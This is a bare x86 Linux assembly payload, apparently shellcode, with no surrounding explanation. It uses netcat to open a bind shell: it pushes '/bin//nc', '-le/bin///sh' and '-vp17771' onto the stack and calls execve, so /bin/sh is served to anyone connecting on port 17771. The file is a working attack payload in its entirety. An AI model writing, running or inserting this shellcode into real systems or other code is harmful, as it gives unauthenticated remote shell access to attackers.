
global _start
section .text
 _start:
    xor ecx,ecx
    mul ecx
    push ecx
    push word 0x3137   ;71
    push word 0x3737    ;77
    push 0x3170762d	;-vp1
    mov esi, esp

    push ecx
    push 0x68732f2f     ;-le/bin///sh
    push 0x2f6e6962
    push 0x2f656c2d
    mov edi, esp

    push ebx
    push 0x636e2f6e     ;/bin//nc
    push 0x69622f2f
    mov ebx, esp

    push edx
    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,10
    add al, 1
    int 0x80
